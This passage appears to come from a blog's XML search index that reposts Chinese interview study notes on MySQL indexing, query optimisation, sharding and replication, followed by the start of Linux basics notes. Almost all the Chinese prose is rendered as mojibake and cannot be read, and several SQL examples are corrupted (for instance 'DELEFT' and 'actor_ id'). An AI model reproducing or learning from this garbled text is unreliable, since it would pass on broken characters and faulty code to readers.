I/Oï¼ˆB+Tree ç´¢å¼•æ˜¯æœ‰åºçš„ï¼Œä¹Ÿå°±å°†ç›¸é‚»çš„æ•°æ®éƒ½å­˜å‚¨åœ¨ä¸€èµ·ï¼‰ã€‚ ç´¢å¼•ä¼˜åŒ–1. ç‹¬ç«‹çš„åˆ—åœ¨è¿›è¡ŒæŸ¥è¯¢æ—¶ï¼Œç´¢å¼•åˆ—ä¸èƒ½æ˜¯è¡¨è¾¾å¼çš„ä¸€éƒ¨åˆ†ï¼Œä¹Ÿä¸èƒ½æ˜¯å‡½æ•°çš„å‚æ•°ï¼Œå¦åˆ™æ— æ³•ä½¿ç”¨ç´¢å¼•ã€‚ ä¾‹å¦‚ä¸‹é¢çš„æŸ¥è¯¢ä¸èƒ½ä½¿ç”¨ actor_id åˆ—çš„ç´¢å¼•ï¼š 1SELECT actor_id FROM sakila.actor WHERE actor_id + 1 = 5; 2. å¤šåˆ—ç´¢å¼•åœ¨éœ€è¦ä½¿ç”¨å¤šä¸ªåˆ—ä½œä¸ºæ¡ä»¶è¿›è¡ŒæŸ¥è¯¢æ—¶ï¼Œä½¿ç”¨å¤šåˆ—ç´¢å¼•æ¯”ä½¿ç”¨å¤šä¸ªå•åˆ—ç´¢å¼•æ€§èƒ½æ›´å¥½ã€‚ä¾‹å¦‚ä¸‹é¢çš„è¯­å¥ä¸­ï¼Œæœ€å¥½æŠŠ actor_id å’Œ film_id è®¾ç½®ä¸ºå¤šåˆ—ç´¢å¼•ã€‚ 12SELECT film_id, actor_ id FROM sakila.film_actorWhERE actor_id = 1 AND film_id = 1; 3. ç´¢å¼•åˆ—çš„é¡ºåºè®©é€‰æ‹©æ€§æœ€å¼ºçš„ç´¢å¼•åˆ—æ”¾åœ¨å‰é¢ï¼Œç´¢å¼•çš„é€‰æ‹©æ€§æ˜¯æŒ‡ï¼šä¸é‡å¤çš„ç´¢å¼•å€¼å’Œè®°å½•æ€»æ•°çš„æ¯”å€¼ã€‚æœ€å¤§å€¼ä¸º 1ï¼Œæ­¤æ—¶æ¯ä¸ªè®°å½•éƒ½æœ‰å”¯ä¸€çš„ç´¢å¼•ä¸å…¶å¯¹åº”ã€‚é€‰æ‹©æ€§è¶Šé«˜ï¼ŒæŸ¥è¯¢æ•ˆç‡ä¹Ÿè¶Šé«˜ã€‚ ä¾‹å¦‚ä¸‹é¢æ˜¾ç¤ºçš„ç»“æœä¸­ customer_id çš„é€‰æ‹©æ€§æ¯” staff_id æ›´é«˜ï¼Œå› æ­¤æœ€å¥½æŠŠ customer_id åˆ—æ”¾åœ¨å¤šåˆ—ç´¢å¼•çš„å‰é¢ã€‚ 1234SELECT COUNT(DISTINCT staff_id)/COUNT(*) AS staff_id_selectivity,COUNT(DISTINCT customer_id)/COUNT(*) AS customer_id_selectivity,COUNT(*)FROM payment; 123 staff_id_selectivity: 0.0001customer_id_selectivity: 0.0373 COUNT(*): 16049 4. å‰ç¼€ç´¢å¼•å¯¹äº BLOBã€TEXT å’Œ VARCHAR ç±»å‹çš„åˆ—ï¼Œå¿…é¡»ä½¿ç”¨å‰ç¼€ç´¢å¼•ï¼Œåªç´¢å¼•å¼€å§‹çš„éƒ¨åˆ†å­—ç¬¦ã€‚ å¯¹äºå‰ç¼€é•¿åº¦çš„é€‰å–éœ€è¦æ ¹æ®ç´¢å¼•é€‰æ‹©æ€§æ¥ç¡®å®šã€‚ 5. è¦†ç›–ç´¢å¼•ç´¢å¼•åŒ…å«æ‰€æœ‰éœ€è¦æŸ¥è¯¢çš„å­—æ®µçš„å€¼ã€‚ å…·æœ‰ä»¥ä¸‹ä¼˜ç‚¹ï¼š å› ä¸ºç´¢å¼•æ¡ç›®é€šå¸¸è¿œå°äºæ•°æ®è¡Œçš„å¤§å°ï¼Œæ‰€ä»¥è‹¥åªè¯»å–ç´¢å¼•ï¼Œèƒ½å¤§å¤§å‡å°‘æ•°æ®è®¿é—®é‡ã€‚ ä¸€äº›å­˜å‚¨å¼•æ“ï¼ˆä¾‹å¦‚ MyISAMï¼‰åœ¨å†…å­˜ä¸­åªç¼“å­˜ç´¢å¼•ï¼Œè€Œæ•°æ®ä¾èµ–äºæ“ä½œç³»ç»Ÿæ¥ç¼“å­˜ã€‚å› æ­¤ï¼Œåªè®¿é—®ç´¢å¼•å¯ä»¥ä¸ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨ï¼ˆé€šå¸¸æ¯”è¾ƒè´¹æ—¶ï¼‰ã€‚ å¯¹äº InnoDB å¼•æ“ï¼Œè‹¥è¾…åŠ©ç´¢å¼•èƒ½å¤Ÿè¦†ç›–æŸ¥è¯¢ï¼Œåˆ™æ— éœ€è®¿é—®ä¸»ç´¢å¼•ã€‚ å››ã€æŸ¥è¯¢æ€§èƒ½ä¼˜åŒ–ä½¿ç”¨ Explain è¿›è¡Œåˆ†æExplain ç”¨æ¥åˆ†æ SELECT æŸ¥è¯¢è¯­å¥ï¼Œå¼€å‘äººå‘˜å¯ä»¥é€šè¿‡åˆ†æ Explain ç»“æœæ¥ä¼˜åŒ–æŸ¥è¯¢è¯­å¥ã€‚ æ¯”è¾ƒé‡è¦çš„å­—æ®µæœ‰ï¼š select_type : æŸ¥è¯¢ç±»å‹ï¼Œæœ‰ç®€å•æŸ¥è¯¢ã€è”åˆæŸ¥è¯¢ã€å­æŸ¥è¯¢ç­‰ key : ä½¿ç”¨çš„ç´¢å¼• rows : æ‰«æçš„è¡Œæ•° æ›´å¤šå†…å®¹è¯·å‚è€ƒï¼šMySQL æ€§èƒ½ä¼˜åŒ–ç¥å™¨ Explain ä½¿ç”¨åˆ†æ ä¼˜åŒ–æ•°æ®è®¿é—®1. å‡å°‘è¯·æ±‚çš„æ•°æ®é‡ï¼ˆä¸€ï¼‰åªè¿”å›å¿…è¦çš„åˆ— æœ€å¥½ä¸è¦ä½¿ç”¨ SELECT * è¯­å¥ã€‚ ï¼ˆäºŒï¼‰åªè¿”å›å¿…è¦çš„è¡Œ ä½¿ç”¨ WHERE è¯­å¥è¿›è¡ŒæŸ¥è¯¢è¿‡æ»¤ï¼Œæœ‰æ—¶å€™ä¹Ÿéœ€è¦ä½¿ç”¨ LIMIT è¯­å¥æ¥é™åˆ¶è¿”å›çš„æ•°æ®ã€‚ ï¼ˆä¸‰ï¼‰ç¼“å­˜é‡å¤æŸ¥è¯¢çš„æ•°æ® ä½¿ç”¨ç¼“å­˜å¯ä»¥é¿å…åœ¨æ•°æ®åº“ä¸­è¿›è¡ŒæŸ¥è¯¢ï¼Œç‰¹åˆ«è¦æŸ¥è¯¢çš„æ•°æ®ç»å¸¸è¢«é‡å¤æŸ¥è¯¢ï¼Œç¼“å­˜å¯ä»¥å¸¦æ¥çš„æŸ¥è¯¢æ€§èƒ½æå‡å°†ä¼šæ˜¯éå¸¸æ˜æ˜¾çš„ã€‚ 2. å‡å°‘æœåŠ¡å™¨ç«¯æ‰«æçš„è¡Œæ•°æœ€æœ‰æ•ˆçš„æ–¹å¼æ˜¯ä½¿ç”¨ç´¢å¼•æ¥è¦†ç›–æŸ¥è¯¢ã€‚ é‡æ„æŸ¥è¯¢æ–¹å¼1. åˆ‡åˆ†å¤§æŸ¥è¯¢ä¸€ä¸ªå¤§æŸ¥è¯¢å¦‚æœä¸€æ¬¡æ€§æ‰§è¡Œçš„è¯ï¼Œå¯èƒ½ä¸€æ¬¡é”ä½å¾ˆå¤šæ•°æ®ã€å æ»¡æ•´ä¸ªäº‹åŠ¡æ—¥å¿—ã€è€—å°½ç³»ç»Ÿèµ„æºã€é˜»å¡å¾ˆå¤šå°çš„ä½†é‡è¦çš„æŸ¥è¯¢ã€‚ 1DELEFT FROM messages WHERE create &lt; DATE_SUB(NOW(), INTERVAL 3 MONTH); 12345rows_affected = 0do &#123; rows_affected = do_query( "DELETE FROM messages WHERE create &lt; DATE_SUB(NOW(), INTERVAL 3 MONTH) LIMIT 10000")&#125; while rows_affected &gt; 0 2. åˆ†è§£å¤§è¿æ¥æŸ¥è¯¢å°†ä¸€ä¸ªå¤§è¿æ¥æŸ¥è¯¢ï¼ˆJOINï¼‰åˆ†è§£æˆå¯¹æ¯ä¸€ä¸ªè¡¨è¿›è¡Œä¸€æ¬¡å•è¡¨æŸ¥è¯¢ï¼Œç„¶åå°†ç»“æœåœ¨åº”ç”¨ç¨‹åºä¸­è¿›è¡Œå…³è”ï¼Œè¿™æ ·åšçš„å¥½å¤„æœ‰ï¼š è®©ç¼“å­˜æ›´é«˜æ•ˆã€‚å¯¹äºè¿æ¥æŸ¥è¯¢ï¼Œå¦‚æœå…¶ä¸­ä¸€ä¸ªè¡¨å‘ç”Ÿå˜åŒ–ï¼Œé‚£ä¹ˆæ•´ä¸ªæŸ¥è¯¢ç¼“å­˜å°±æ— æ³•ä½¿ç”¨ã€‚è€Œåˆ†è§£åçš„å¤šä¸ªæŸ¥è¯¢ï¼Œå³ä½¿å…¶ä¸­ä¸€ä¸ªè¡¨å‘ç”Ÿå˜åŒ–ï¼Œå¯¹å…¶å®ƒè¡¨çš„æŸ¥è¯¢ç¼“å­˜ä¾ç„¶å¯ä»¥ä½¿ç”¨ã€‚ åˆ†è§£æˆå¤šä¸ªå•è¡¨æŸ¥è¯¢ï¼Œè¿™äº›å•è¡¨æŸ¥è¯¢çš„ç¼“å­˜ç»“æœæ›´å¯èƒ½è¢«å…¶å®ƒæŸ¥è¯¢ä½¿ç”¨åˆ°ï¼Œä»è€Œå‡å°‘å†—ä½™è®°å½•çš„æŸ¥è¯¢ã€‚ å‡å°‘é”ç«äº‰ï¼› åœ¨åº”ç”¨å±‚è¿›è¡Œè¿æ¥ï¼Œå¯ä»¥æ›´å®¹æ˜“å¯¹æ•°æ®åº“è¿›è¡Œæ‹†åˆ†ï¼Œä»è€Œæ›´å®¹æ˜“åšåˆ°é«˜æ€§èƒ½å’Œå¯æ‰©å±•ã€‚ æŸ¥è¯¢æœ¬èº«æ•ˆç‡ä¹Ÿå¯èƒ½ä¼šæœ‰æ‰€æå‡ã€‚ä¾‹å¦‚ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œä½¿ç”¨ IN() ä»£æ›¿è¿æ¥æŸ¥è¯¢ï¼Œå¯ä»¥è®© MySQL æŒ‰ç…§ ID é¡ºåºè¿›è¡ŒæŸ¥è¯¢ï¼Œè¿™å¯èƒ½æ¯”éšæœºçš„è¿æ¥è¦æ›´é«˜æ•ˆã€‚ 1234SELECT * FROM tagJOIN tag_post ON tag_post.tag_id=tag.idJOIN post ON tag_post.post_id=post.idWHERE tag.tag='mysql'; 123SELECT * FROM tag WHERE tag='mysql';SELECT * FROM tag_post WHERE tag_id=1234;SELECT * FROM post WHERE post.id IN (123,456,567,9098,8904); äº”ã€åˆ‡åˆ†æ°´å¹³åˆ‡åˆ† æ°´å¹³åˆ‡åˆ†åˆç§°ä¸º Shardingï¼Œå®ƒæ˜¯å°†åŒä¸€ä¸ªè¡¨ä¸­çš„è®°å½•æ‹†åˆ†åˆ°å¤šä¸ªç»“æ„ç›¸åŒçš„è¡¨ä¸­ã€‚ å½“ä¸€ä¸ªè¡¨çš„æ•°æ®ä¸æ–­å¢å¤šæ—¶ï¼ŒSharding æ˜¯å¿…ç„¶çš„é€‰æ‹©ï¼Œå®ƒå¯ä»¥å°†æ•°æ®åˆ†å¸ƒåˆ°é›†ç¾¤çš„ä¸åŒèŠ‚ç‚¹ä¸Šï¼Œä»è€Œç¼“å­˜å•ä¸ªæ•°æ®åº“çš„å‹åŠ›ã€‚ å‚ç›´åˆ‡åˆ† å‚ç›´åˆ‡åˆ†æ˜¯å°†ä¸€å¼ è¡¨æŒ‰åˆ—åˆ‡åˆ†æˆå¤šä¸ªè¡¨ï¼Œé€šå¸¸æ˜¯æŒ‰ç…§åˆ—çš„å…³ç³»å¯†é›†ç¨‹åº¦è¿›è¡Œåˆ‡åˆ†ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨å‚ç›´åˆ‡åˆ†å°†ç»å¸¸è¢«ä½¿ç”¨çš„åˆ—å’Œä¸ç»å¸¸è¢«ä½¿ç”¨çš„åˆ—åˆ‡åˆ†åˆ°ä¸åŒçš„è¡¨ä¸­ã€‚ åœ¨æ•°æ®åº“çš„å±‚é¢ä½¿ç”¨å‚ç›´åˆ‡åˆ†å°†æŒ‰æ•°æ®åº“ä¸­è¡¨çš„å¯†é›†ç¨‹åº¦éƒ¨ç½²åˆ°ä¸åŒçš„åº“ä¸­ï¼Œä¾‹å¦‚å°†åŸæ¥çš„ç”µå•†æ•°æ®åº“å‚ç›´åˆ‡åˆ†æˆå•†å“æ•°æ®åº“ payDBã€ç”¨æˆ·æ•°æ®åº“ userBD ç­‰ã€‚ Sharding ç­–ç•¥ å“ˆå¸Œå–æ¨¡ï¼šhash(key) % NUM_DB èŒƒå›´ï¼šå¯ä»¥æ˜¯ ID èŒƒå›´ä¹Ÿå¯ä»¥æ˜¯æ—¶é—´èŒƒå›´ æ˜ å°„è¡¨ï¼šä½¿ç”¨å•ç‹¬çš„ä¸€ä¸ªæ•°æ®åº“æ¥å­˜å‚¨æ˜ å°„å…³ç³» Sharding å­˜åœ¨çš„é—®é¢˜åŠè§£å†³æ–¹æ¡ˆ1. äº‹åŠ¡é—®é¢˜ä½¿ç”¨åˆ†å¸ƒå¼äº‹åŠ¡æ¥è§£å†³ï¼Œæ¯”å¦‚ XA æ¥å£ã€‚ 2. JOINå¯ä»¥å°†åŸæ¥çš„ JOIN æŸ¥è¯¢åˆ†è§£æˆå¤šä¸ªå•è¡¨æŸ¥è¯¢ï¼Œç„¶ååœ¨ç”¨æˆ·ç¨‹åºä¸­è¿›è¡Œ JOINã€‚ 3. ID å”¯ä¸€æ€§ ä½¿ç”¨å…¨å±€å”¯ä¸€ IDï¼šGUIDã€‚ ä¸ºæ¯ä¸ªåˆ†ç‰‡æŒ‡å®šä¸€ä¸ª ID èŒƒå›´ã€‚ åˆ†å¸ƒå¼ ID ç”Ÿæˆå™¨ (å¦‚ Twitter çš„ Snowflake ç®—æ³•)ã€‚ æ›´å¤šå†…å®¹è¯·å‚è€ƒï¼š How Sharding Works å¤§ä¼—ç‚¹è¯„è®¢å•ç³»ç»Ÿåˆ†åº“åˆ†è¡¨å®è·µ å…­ã€å¤åˆ¶ä¸»ä»å¤åˆ¶ä¸»è¦æ¶‰åŠä¸‰ä¸ªçº¿ç¨‹ï¼šbinlog çº¿ç¨‹ã€I/O çº¿ç¨‹å’Œ SQL çº¿ç¨‹ã€‚ binlog çº¿ç¨‹ ï¼šè´Ÿè´£å°†ä¸»æœåŠ¡å™¨ä¸Šçš„æ•°æ®æ›´æ”¹å†™å…¥äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆbinlogï¼‰ä¸­ã€‚ I/O çº¿ç¨‹ ï¼šè´Ÿè´£ä»ä¸»æœåŠ¡å™¨ä¸Šè¯»å–äºŒè¿›åˆ¶æ—¥å¿—æ–‡ä»¶ï¼Œå¹¶å†™å…¥ä»æœåŠ¡å™¨çš„ä¸­ç»§æ—¥å¿—ä¸­ã€‚ SQL çº¿ç¨‹ ï¼šè´Ÿè´£è¯»å–ä¸­ç»§æ—¥å¿—å¹¶é‡æ”¾å…¶ä¸­çš„ SQL è¯­å¥ã€‚ è¯»å†™åˆ†ç¦»ä¸»æœåŠ¡å™¨ç”¨æ¥å¤„ç†å†™æ“ä½œä»¥åŠå®æ—¶æ€§è¦æ±‚æ¯”è¾ƒé«˜çš„è¯»æ“ä½œï¼Œè€Œä»æœåŠ¡å™¨ç”¨æ¥å¤„ç†è¯»æ“ä½œã€‚ è¯»å†™åˆ†ç¦»å¸¸ç”¨ä»£ç†æ–¹å¼æ¥å®ç°ï¼Œä»£ç†æœåŠ¡å™¨æ¥æ”¶åº”ç”¨å±‚ä¼ æ¥çš„è¯»å†™è¯·æ±‚ï¼Œç„¶åå†³å®šè½¬å‘åˆ°å“ªä¸ªæœåŠ¡å™¨ã€‚ MySQL è¯»å†™åˆ†ç¦»èƒ½æé«˜æ€§èƒ½çš„åŸå› åœ¨äºï¼š ä¸»ä»æœåŠ¡å™¨è´Ÿè´£å„è‡ªçš„è¯»å’Œå†™ï¼Œæå¤§ç¨‹åº¦ç¼“è§£äº†é”çš„äº‰ç”¨ï¼› ä»æœåŠ¡å™¨å¯ä»¥é…ç½® MyISAM å¼•æ“ï¼Œæå‡æŸ¥è¯¢æ€§èƒ½ä»¥åŠèŠ‚çº¦ç³»ç»Ÿå¼€é”€ï¼› å¢åŠ å†—ä½™ï¼Œæé«˜å¯ç”¨æ€§ã€‚ å‚è€ƒèµ„æ–™ BaronScbwartz, PeterZaitsev, VadimTkacbenko, ç­‰. é«˜æ€§èƒ½ MySQL[M]. ç”µå­å·¥ä¸šå‡ºç‰ˆç¤¾, 2013. å§œæ‰¿å°§. MySQL æŠ€æœ¯å†…å¹•: InnoDB å­˜å‚¨å¼•æ“ [M]. æœºæ¢°å·¥ä¸šå‡ºç‰ˆç¤¾, 2011. 20+ æ¡ MySQL æ€§èƒ½ä¼˜åŒ–çš„æœ€ä½³ç»éªŒ æœåŠ¡ç«¯æŒ‡å— æ•°æ®å­˜å‚¨ç¯‡ | MySQLï¼ˆ09ï¼‰ åˆ†åº“ä¸åˆ†è¡¨å¸¦æ¥çš„åˆ†å¸ƒå¼å›°å¢ƒä¸åº”å¯¹ä¹‹ç­– How to create unique row ID in sharded databases? SQL Azure Federation â€“ Introduction]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2FLinux%2F</url>
    <content type="text"><![CDATA[ä¸€ã€å¸¸ç”¨æ“ä½œä»¥åŠæ¦‚å¿µ å¿«æ·é”® æ±‚åŠ© å…³æœº PATH sudo åŒ…ç®¡ç†å·¥å…· å‘è¡Œç‰ˆ VIM ä¸‰ä¸ªæ¨¡å¼ GNU å¼€æºåè®® äºŒã€ç£ç›˜ HDD ç£ç›˜æ¥å£ ç£ç›˜çš„æ–‡ä»¶å ä¸‰ã€åˆ†åŒº åˆ†åŒºè¡¨ å¼€æœºæ£€æµ‹ç¨‹åº å››ã€æ–‡ä»¶ç³»ç»Ÿ åˆ†åŒºä¸æ–‡ä»¶ç³»ç»Ÿ ç»„æˆ æ–‡ä»¶è¯»å– ç£ç›˜ç¢ç‰‡ block inode ç›®å½• æ—¥å¿— æŒ‚è½½ ç›®å½•é…ç½® äº”ã€æ–‡ä»¶ æ–‡ä»¶å±æ€§ æ–‡ä»¶ä¸ç›®å½•çš„åŸºæœ¬æ“ä½œ ä¿®æ”¹æƒé™ æ–‡ä»¶é»˜è®¤æƒé™ ç›®å½•çš„æƒé™ é“¾æ¥ è·å–æ–‡ä»¶å†…å®¹ æŒ‡ä»¤ä¸æ–‡ä»¶æœç´¢ å…­ã€å‹ç¼©ä¸æ‰“åŒ… å‹ç¼©æ–‡ä»¶å å‹ç¼©æŒ‡ä»¤ æ‰“åŒ… ä¸ƒã€Bash ç‰¹æ€§ å˜é‡æ“ä½œ æŒ‡ä»¤æœç´¢é¡ºåº æ•°æ®æµé‡å®šå‘ å…«ã€ç®¡çº¿æŒ‡ä»¤ æå–æŒ‡ä»¤ æ’åºæŒ‡ä»¤ åŒå‘è¾“å‡ºé‡å®šå‘ å­—ç¬¦è½¬æ¢æŒ‡ä»¤ åˆ†åŒºæŒ‡ä»¤ ä¹ã€æ­£åˆ™è¡¨è¾¾å¼ grep printf awk åã€è¿›ç¨‹ç®¡ç† æŸ¥çœ‹è¿›ç¨‹ è¿›ç¨‹çŠ¶æ€ SIGCHLD wait() waitpid() å­¤å„¿è¿›ç¨‹ åƒµå°¸è¿›ç¨‹ å‚è€ƒèµ„æ–™ ä¸€ã€å¸¸ç”¨æ“ä½œä»¥åŠæ¦‚å¿µå¿«æ·é”® Tabï¼šå‘½ä»¤å’Œæ–‡ä»¶åè¡¥å…¨ï¼› Ctrl+Cï¼šä¸­æ–­æ­£åœ¨è¿è¡Œçš„ç¨‹åºï¼› Ctrl+Dï¼šç»“æŸé”®ç›˜è¾“å…¥ï¼ˆEnd Of Fileï¼ŒEOFï¼‰ æ±‚åŠ©1. â€“helpæŒ‡ä»¤çš„åŸºæœ¬ç”¨æ³•ä¸é€‰é¡¹ä»‹ç»ã€‚ 2. manman æ˜¯ manual çš„ç¼©å†™ï¼Œå°†æŒ‡ä»¤çš„å…·ä½“ä¿¡æ¯æ˜¾ç¤ºå‡ºæ¥ã€‚ å½“æ‰§è¡Œman dateæ—¶ï¼Œæœ‰ DATE(1) å‡ºç°ï¼Œå…¶ä¸­çš„æ•°å­—ä»£è¡¨æŒ‡ä»¤çš„ç±»å‹ï¼Œå¸¸ç”¨çš„æ•°å­—åŠå…¶ç±»å‹å¦‚ä¸‹ï¼š ä»£å· ç±»å‹ 1 ç”¨æˆ·åœ¨ shell ç¯å¢ƒä¸­å¯ä»¥æ“ä½œçš„æŒ‡ä»¤æˆ–è€…å¯æ‰§è¡Œæ–‡ä»¶ 5 é…ç½®æ–‡ä»¶ 8 ç³»ç»Ÿç®¡ç†å‘˜å¯ä»¥ä½¿ç”¨çš„ç®¡ç†æŒ‡ä»¤ 3. infoinfo ä¸ man ç±»ä¼¼ï¼Œä½†æ˜¯ info å°†æ–‡æ¡£åˆ†æˆä¸€ä¸ªä¸ªé¡µé¢ï¼Œæ¯ä¸ªé¡µé¢å¯ä»¥è¿›è¡Œè·³è½¬ã€‚ 4. doc/usr/share/doc å­˜æ”¾ç€è½¯ä»¶çš„ä¸€æ•´å¥—è¯´æ˜æ–‡ä»¶ã€‚ å…³æœº1. whoåœ¨å…³æœºå‰éœ€è¦å…ˆä½¿ç”¨ who å‘½ä»¤æŸ¥çœ‹æœ‰æ²¡æœ‰å…¶å®ƒç”¨æˆ·åœ¨çº¿ã€‚ 2. syncä¸ºäº†åŠ å¿«å¯¹ç£ç›˜æ–‡ä»¶çš„è¯»å†™é€Ÿåº¦ï¼Œä½äºå†…å­˜ä¸­çš„æ–‡ä»¶æ•°æ®ä¸ä¼šç«‹å³åŒæ­¥åˆ°ç£ç›˜ä¸Šï¼Œå› æ­¤å…³æœºä¹‹å‰éœ€è¦å…ˆè¿›è¡Œ sync åŒæ­¥æ“ä½œã€‚ 3. shutdown12345# shutdown [-krhc] æ—¶é—´ [ä¿¡æ¯]-k ï¼š ä¸ä¼šå…³æœºï¼Œåªæ˜¯å‘é€è­¦å‘Šä¿¡æ¯ï¼Œé€šçŸ¥æ‰€æœ‰åœ¨çº¿çš„ç”¨æˆ·-r ï¼š å°†ç³»ç»Ÿçš„æœåŠ¡åœæ‰åå°±é‡æ–°å¯åŠ¨-h ï¼š å°†ç³»ç»Ÿçš„æœåŠ¡åœæ‰åå°±ç«‹å³å…³æœº-c ï¼š å–æ¶ˆå·²ç»åœ¨è¿›è¡Œçš„ shutdown æŒ‡ä»¤å†…å®¹ PATHå¯ä»¥åœ¨ç¯å¢ƒå˜é‡ PATH ä¸­å£°æ˜å¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„ï¼Œè·¯å¾„ä¹‹é—´ç”¨ : åˆ†éš”ã€‚ 1/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/dmtsai/.local/bin:/home/dmtsai/bin env å‘½ä»¤å¯ä»¥è·å–å½“å‰ç»ˆç«¯çš„ç¯å¢ƒå˜é‡ã€‚ sudosudo å…è®¸ä¸€èˆ¬ç”¨æˆ·ä½¿ç”¨ root å¯æ‰§è¡Œçš„å‘½ä»¤ï¼Œä¸è¿‡åªæœ‰åœ¨ /etc/sudoers é…ç½®æ–‡ä»¶ä¸­æ·»åŠ çš„ç”¨æˆ·æ‰èƒ½ä½¿ç”¨è¯¥æŒ‡ä»¤ã€‚ åŒ…ç®¡ç†å·¥å…·RPM å’Œ DPKG ä¸ºæœ€å¸¸è§çš„ä¸¤ç±»è½¯ä»¶åŒ…ç®¡ç†å·¥å…·ã€‚RPM å…¨ç§°ä¸º Redhat Package Managerï¼Œæœ€æ—©ç”± Red Hat å…¬å¸åˆ¶å®šå®æ–½ï¼Œéšåè¢« GNU å¼€æºæ“ä½œç³»ç»Ÿæ¥å—å¹¶æˆä¸ºå¾ˆå¤š Linux ç³»ç»Ÿ (RHEL) çš„æ—¢å®šè½¯ä»¶æ ‡å‡†ã€‚ä¸ RPM è¿›è¡Œç«äº‰çš„æ˜¯åŸºäº Debian æ“ä½œç³»ç»Ÿ (UBUNTU) çš„ DEB è½¯ä»¶åŒ…ç®¡ç†å·¥å…· DPKGï¼Œå…¨ç§°ä¸º Debian Packageï¼ŒåŠŸèƒ½æ–¹é¢ä¸ RPM ç›¸ä¼¼ã€‚ YUM åŸºäº RPMï¼Œå…·æœ‰ä¾èµ–ç®¡ç†åŠŸèƒ½ï¼Œå¹¶å…·æœ‰è½¯ä»¶å‡çº§çš„åŠŸèƒ½ã€‚ å‘è¡Œç‰ˆLinux å‘è¡Œç‰ˆæ˜¯ Linux å†…æ ¸åŠå„ç§åº”ç”¨è½¯ä»¶çš„é›†æˆç‰ˆæœ¬ã€‚ åŸºäºçš„åŒ…ç®¡ç†å·¥å…· å•†ä¸šå‘è¡Œç‰ˆ ç¤¾åŒºå‘è¡Œç‰ˆ RPM Red Hat Fedora / CentOS DPKG Ubuntu Debian VIM ä¸‰ä¸ªæ¨¡å¼ ä¸€èˆ¬æŒ‡ä»¤æ¨¡å¼ï¼ˆCommand modeï¼‰ï¼šVIM çš„é»˜è®¤æ¨¡å¼ï¼Œå¯ä»¥ç”¨äºç§»åŠ¨æ¸¸æ ‡æŸ¥çœ‹å†…å®¹ï¼› ç¼–è¾‘æ¨¡å¼ï¼ˆInsert modeï¼‰ï¼šæŒ‰ä¸‹ â€œiâ€ ç­‰æŒ‰é”®ä¹‹åè¿›å…¥ï¼Œå¯ä»¥å¯¹æ–‡æœ¬è¿›è¡Œç¼–è¾‘ï¼› æŒ‡ä»¤åˆ—æ¨¡å¼ï¼ˆBottom-line modeï¼‰ï¼šæŒ‰ä¸‹ â€œ:â€ æŒ‰é”®ä¹‹åè¿›å…¥ï¼Œç”¨äºä¿å­˜é€€å‡ºç­‰æ“ä½œã€‚ åœ¨æŒ‡ä»¤åˆ—æ¨¡å¼ä¸‹ï¼Œæœ‰ä»¥ä¸‹å‘½ä»¤ç”¨äºç¦»å¼€æˆ–è€…ä¿å­˜æ–‡ä»¶ã€‚ å‘½ä»¤ ä½œç”¨ :w å†™å…¥ç£ç›˜ :w! å½“æ–‡ä»¶ä¸ºåªè¯»æ—¶ï¼Œå¼ºåˆ¶å†™å…¥ç£ç›˜ã€‚åˆ°åº•èƒ½ä¸èƒ½å†™å…¥ï¼Œä¸ç”¨æˆ·å¯¹è¯¥æ–‡ä»¶çš„æƒé™æœ‰å…³ :q ç¦»å¼€ :q! å¼ºåˆ¶ç¦»å¼€ä¸ä¿å­˜ :wq å†™å…¥ç£ç›˜åç¦»å¼€ :wq! å¼ºåˆ¶å†™å…¥ç£ç›˜åç¦»å¼€ GNUGNU è®¡åˆ’ï¼Œè¯‘ä¸ºé©å¥´è®¡åˆ’ï¼Œå®ƒçš„ç›®æ ‡æ˜¯åˆ›å»ºä¸€å¥—å®Œå…¨è‡ªç”±çš„æ“ä½œç³»ç»Ÿï¼Œç§°ä¸º GNUï¼Œå…¶å†…å®¹è½¯ä»¶å®Œå…¨ä»¥ GPL æ–¹å¼å‘å¸ƒã€‚å…¶ä¸­ GPL å…¨ç§°ä¸º GNU é€šç”¨å…¬å…±è®¸å¯åè®®ï¼ŒåŒ…å«äº†ä»¥ä¸‹å†…å®¹ï¼š ä»¥ä»»ä½•ç›®çš„è¿è¡Œæ­¤ç¨‹åºçš„è‡ªç”±ï¼› å†å¤åˆ¶çš„è‡ªç”±ï¼› æ”¹è¿›æ­¤ç¨‹åºï¼Œå¹¶å…¬å¼€å‘å¸ƒæ”¹è¿›çš„è‡ªç”±ã€‚ å¼€æºåè®® Choose an open source license å¦‚ä½•é€‰æ‹©å¼€æºè®¸å¯è¯ï¼Ÿ äºŒã€ç£ç›˜HDDHard Disk Drives(HDD) ä¿—ç§°ç¡¬ç›˜ï¼Œå…·æœ‰ä»¥ä¸‹ç»“æ„ï¼š ç›˜é¢ï¼ˆPlatterï¼‰ï¼šä¸€ä¸ªç¡¬ç›˜æœ‰å¤šä¸ªç›˜é¢ï¼› ç£é“ï¼ˆTrackï¼‰ï¼šç›˜é¢ä¸Šçš„åœ†å½¢å¸¦çŠ¶åŒºåŸŸï¼Œä¸€ä¸ªç›˜é¢å¯ä»¥æœ‰å¤šä¸ªç£é“ï¼› æ‰‡åŒºï¼ˆTrack Sectorï¼‰ï¼šç£é“ä¸Šçš„ä¸€ä¸ªå¼§æ®µï¼Œä¸€ä¸ªç£é“å¯ä»¥æœ‰å¤šä¸ªæ‰‡åŒºï¼Œå®ƒæ˜¯æœ€å°çš„ç‰©ç†å‚¨å­˜å•ä½ï¼Œç›®å‰ä¸»è¦æœ‰ 512 bytes ä¸ 4 K ä¸¤ç§å¤§å°ï¼› ç£å¤´ï¼ˆHeadï¼‰ï¼šä¸ç›˜é¢éå¸¸æ¥è¿‘ï¼Œèƒ½å¤Ÿå°†ç›˜é¢ä¸Šçš„ç£åœºè½¬æ¢ä¸ºç”µä¿¡å·ï¼ˆè¯»ï¼‰ï¼Œæˆ–è€…å°†ç”µä¿¡å·è½¬æ¢ä¸ºç›˜é¢çš„ç£åœºï¼ˆå†™ï¼‰ï¼› 